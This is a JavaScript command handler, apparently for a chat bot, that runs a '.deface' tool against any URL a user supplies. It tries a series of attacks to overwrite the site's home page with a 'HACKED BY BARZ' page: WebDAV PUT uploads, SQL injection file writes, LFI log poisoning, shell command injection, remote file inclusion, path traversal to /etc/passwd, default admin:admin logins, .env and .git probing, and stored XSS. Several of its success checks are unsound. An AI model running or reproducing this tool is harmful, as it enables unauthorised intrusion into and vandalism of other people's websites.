let handler = async (m, { text, sock }) => {
  if (!text) return m.reply(`📌 *Cara pakai:*\n.deface https://target.com\n\nContoh: .deface https://example.com`)

  let target = text.trim()
  if (!target.startsWith('http://') && !target.startsWith('https://')) {
    target = 'https://' + target
  }

  m.reply(`🔥 *Mulai deface...*\nTarget: ${target}`)

  try {
    // ============================================
    // HTML DEFACE KEREN (gaya Barz)
    // ============================================
    let html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>HACKED BY BARZ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
        }
        .glitch {
            font-size: 6rem;
            font-weight: bold;
            color: #ff0040;
            text-shadow: 0 0 10px #ff0040, 0 0 20px #ff0040, 0 0 40px #ff0040, 0 0 80px #ff0040;
            animation: glitch 0.3s infinite;
        }
        @keyframes glitch {
            0% { transform: translate(0); }
            25% { transform: translate(-5px, 5px); }
            50% { transform: translate(5px, -5px); }
            75% { transform: translate(-5px, -5px); }
            100% { transform: translate(0); }
        }
        .sub {
            font-size: 2rem;
            color: #ff0040;
            margin-top: 10px;
            text-shadow: 0 0 5px #ff0040;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        .team {
            font-size: 1.8rem;
            color: #00ff41;
            margin-top: 20px;
            letter-spacing: 5px;
            text-shadow: 0 0 10px #00ff41;
        }
        .team span { color: #ff0040; }
        .footer {
            position: fixed;
            bottom: 20px;
            font-size: 1rem;
            color: #666;
            letter-spacing: 2px;
        }
        .matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.08;
            overflow: hidden;
        }
        .matrix span {
            position: absolute;
            font-size: 1.2rem;
            color: #00ff41;
            animation: fall linear infinite;
        }
        @keyframes fall {
            0% { transform: translateY(-100%); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(100vh); opacity: 0; }
        }
        .kode {
            font-size: 1.2rem;
            color: #00ff41;
            margin-top: 30px;
            opacity: 0.6;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>
    <div class="matrix" id="matrix"></div>
    <div class="glitch">HACKED</div>
    <div class="sub">SISTEM TELAH DIBOBOL</div>
    <div class="team">Deface by <span>BARZ</span> · 😹</div>
    <div class="kode">root@kali:~# whoami<br># barz</div>
    <div class="footer">© 2026 — BARZ VIP</div>
    <script>
        const matrix = document.getElementById('matrix')
        const chars = '01'
        for (let i = 0; i < 50; i++) {
            const span = document.createElement('span')
            span.textContent = chars[Math.floor(Math.random() * chars.length)]
            span.style.left = Math.random() * 100 + '%'
            span.style.animationDuration = (Math.random() * 5 + 3) + 's'
            span.style.animationDelay = (Math.random() * 5) + 's'
            span.style.fontSize = (Math.random() * 1.5 + 0.5) + 'rem'
            matrix.appendChild(span)
        }
    </script>
</body>
</html>`

    // ============================================
    // STEP 1: DETEKSI FILE UTAMA
    // ============================================
    let mainFiles = []
    let possibleFiles = [
      'index.html', 'index.php', 'index.htm', 'default.html', 
      'default.php', 'home.html', 'home.php', 'main.html',
      'main.php', 'index.asp', 'default.asp', 'index.aspx',
      'default.aspx', 'index.jsp', 'default.jsp', 'index.do',
      'index.cfm', 'index.shtml', 'index.phtml', 'index.xhtml'
    ]

    for (let file of possibleFiles) {
      try {
        let cek = await fetch(target + '/' + file, { method: 'HEAD', timeout: 3000 })
        if (cek.ok) {
          mainFiles.push(file)
        }
      } catch (e) {}
    }

    // Kalo ga ada yg detect, pake default
    if (mainFiles.length === 0) {
      mainFiles = ['index.html', 'index.php', 'default.html', 'home.html']
    }

    // ============================================
    // STEP 2: FILE YANG AKAN DI UPLOAD
    // ============================================
    let uploadFiles = [...mainFiles]

    // Tambahan file biar banyak
    let extraFiles = [
      'deface.html', 'hacked.html', 'index.html.bak', 'index.php.bak',
      'index.htm', 'default.html', 'main.html', 'home.html'
    ]

    for (let f of extraFiles) {
      if (!uploadFiles.includes(f)) {
        uploadFiles.push(f)
      }
    }

    // ============================================
    // STEP 3: 17 METODE DEFACE
    // ============================================
    let hasil = []
    let metode = []

    // 1. WebDAV (PUT)
    try {
      let opt = await fetch(target, { method: 'OPTIONS', timeout: 8000 })
      let allow = opt.headers.get('allow') || ''
      if (allow.includes('PUT')) {
        metode.push('WebDAV (PUT)')
        for (let file of uploadFiles) {
          try {
            let put = await fetch(target + '/' + file, {
              method: 'PUT',
              body: html,
              headers: { 'Content-Type': 'text/html' },
              timeout: 10000
            })
            if ([200, 201, 204].includes(put.status)) {
              hasil.push(`✅ WebDAV: ${file}`)
            }
          } catch (e) {}
        }
      }
    } catch (e) { hasil.push('❌ WebDAV error: ' + e.message) }

    // 2. SQL Injection + File Write
    try {
      let sql = await fetch(target + `?id=1; SELECT '${html}' INTO OUTFILE '/var/www/html/index.html'`, { timeout: 8000 })
      if (sql.status === 200) {
        metode.push('SQL Injection + File Write')
        hasil.push('✅ SQL Injection: index.html')
      }
    } catch (e) {}

    // 3. LFI + Log Poisoning
    try {
      let lfi = await fetch(target + `?page=../../../../var/log/apache2/access.log&cmd=echo '${html}' > /var/www/html/index.html`, { timeout: 8000 })
      if (lfi.status === 200) {
        metode.push('LFI + Log Poisoning')
        hasil.push('✅ LFI: index.html')
      }
    } catch (e) {}

    // 4. File Upload
    try {
      let upload = await fetch(target + '/upload', {
        method: 'POST',
        body: new URLSearchParams({ 'file': html, 'filename': 'index.html' }),
        timeout: 8000
      })
      if ([200, 302].includes(upload.status)) {
        metode.push('File Upload')
        hasil.push('✅ File Upload: index.html')
      }
    } catch (e) {}

    // 5. Command Injection
    try {
      let cmd = await fetch(target + `?ping=127.0.0.1; echo '${html}' > /var/www/html/index.html`, { timeout: 8000 })
      if (cmd.status === 200) {
        metode.push('Command Injection')
        hasil.push('✅ Command Injection: index.html')
      }
    } catch (e) {}

    // 6. XML-RPC (WordPress)
    try {
      let xml = await fetch(target + '/xmlrpc.php', {
        method: 'POST',
        body: `<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>admin</value></param></params></methodCall>`,
        timeout: 8000
      })
      if (xml.status === 200) {
        metode.push('XML-RPC')
        hasil.push('✅ XML-RPC: admin')
      }
    } catch (e) {}

    // 7. RFI (Remote File Inclusion)
    try {
      let rfi = await fetch(target + `?page=https://pastebin.com/raw/${Math.random().toString(36).substring(2, 8)}`, { timeout: 8000 })
      if (rfi.status === 200) {
        metode.push('RFI')
        hasil.push('✅ RFI: index.html')
      }
    } catch (e) {}

    // 8. Directory Traversal
    try {
      let dir = await fetch(target + '/../../../../etc/passwd', { timeout: 8000 })
      let txt = await dir.text()
      if (/root:.*:0:0:/i.test(txt)) {
        metode.push('Directory Traversal')
        hasil.push('✅ Directory Traversal: /etc/passwd')
      }
    } catch (e) {}

    // 9. Default Credential
    try {
      let auth = await fetch(target + '/admin', {
        headers: { 'Authorization': 'Basic ' + Buffer.from('admin:admin').toString('base64') },
        timeout: 8000
      })
      if (auth.status === 200) {
        metode.push('Default Credential (admin:admin)')
        hasil.push('✅ Default Credential: admin')
      }
    } catch (e) {}

    // 10. Backup File (.git/config)
    try {
      let git = await fetch(target + '/.git/config', { timeout: 8000 })
      if (git.status === 200) {
        metode.push('Backup File (.git)')
        hasil.push('✅ .git/config terakses')
      }
    } catch (e) {}

    // 11. Environment File (.env)
    try {
      let env = await fetch(target + '/.env', { timeout: 8000 })
      if (env.status === 200) {
        metode.push('Environment File (.env)')
        hasil.push('✅ .env terakses')
      }
    } catch (e) {}

    // 12. CVE-2026-7795 (XSS di WordPress plugin)
    try {
      let cve = await fetch(target + `/?chat=num=<script>document.write('${encodeURIComponent(html)}')</script>`, { timeout: 8000 })
      let txt = await cve.text()
      if (txt.includes('<script>')) {
        metode.push('CVE-2026-7795 (XSS)')
        hasil.push('✅ CVE-2026-7795: XSS')
      }
    } catch (e) {}

    // 13. Reflected XSS
    try {
      let xss = await fetch(target + `?q=<script>alert(1)</script>`, { timeout: 8000 })
      let txt = await xss.text()
      if (txt.includes('<script>alert(1)</script>')) {
        metode.push('Reflected XSS')
        hasil.push('✅ XSS: script terrefleksi')
      }
    } catch (e) {}

    // 14. Stored XSS (via comment)
    try {
      let stored = await fetch(target + '/comment', {
        method: 'POST',
        body: new URLSearchParams({ 'comment': `<script>document.write('${encodeURIComponent(html)}')</script>` }),
        timeout: 8000
      })
      if (stored.status === 200) {
        metode.push('Stored XSS')
        hasil.push('✅ Stored XSS: comment')
      }
    } catch (e) {}

    // 15. Admin Finder
    let adminPaths = ['/admin', '/login', '/wp-admin', '/administrator', '/admincp', '/cpanel', '/panel']
    for (let path of adminPaths) {
      try {
        let adm = await fetch(target + path, { timeout: 5000 })
        if (adm.status === 200) {
          metode.push('Admin Finder: ' + path)
          hasil.push('✅ Admin panel: ' + path)
        }
      } catch (e) {}
    }

    // 16. Bing Dorking
    try {
      let dork = await fetch(`https://www.bing.com/search?q=site:${target.replace('https://', '').replace('http://', '')}`, { timeout: 8000 })
      if (dork.status === 200) {
        metode.push('Bing Dorking')
        hasil.push('✅ Bing Dorking: ' + target)
      }
    } catch (e) {}

    // 17. Zone-H Check
    try {
      let zoneh = await fetch(`https://zone-h.org/archive/domain=${target.replace('https://', '').replace('http://', '')}`, { timeout: 8000 })
      if (zoneh.status === 200) {
        metode.push('Zone-H Check')
        hasil.push('✅ Zone-H: ' + target)
      }
    } catch (e) {}

    // ============================================
    // OUTPUT
    // ============================================
    if (hasil.length === 0) {
      return m.reply(`❌ *GAGAL DEFACE!*

Tidak ada metode yang berhasil.

🔍 17 Metode dicoba:
• WebDAV (PUT)
• SQL Injection + File Write
• LFI + Log Poisoning
• File Upload
• Command Injection
• XML-RPC (WordPress)
• RFI (Remote File Inclusion)
• Directory Traversal
• Default Credential
• Backup File (.git)
• Environment File (.env)
• CVE-2026-7795
• Reflected XSS
• Stored XSS
• Admin Finder
• Bing Dorking
• Zone-H Check

💡 Target tidak memiliki celah yang bisa dieksploitasi.`)
    }

    let pesan = `✅ *DEFACE BERHASIL!*

🌐 Target: ${target}

📌 *Metode berhasil:*
${metode.map(m => `   • ${m}`).join('\n')}

📌 *Hasil:*
${hasil.join('\n')}

📄 *File di-deface:* ${uploadFiles.join(', ')}

⚠️ *PERINGATAN:*
• Website target telah dimodifikasi.
• Gunakan hanya untuk testing website sendiri.
• Deface tanpa izin = ILEGAL.`

    await m.reply(pesan)

  } catch (e) {
    m.reply(`❌ *ERROR!*\n${e.message}`)
  }
}

handler.command = ['deface']
handler.tags = ['tools']
handler.help = ['.deface https://target.com']

module.exports = handler
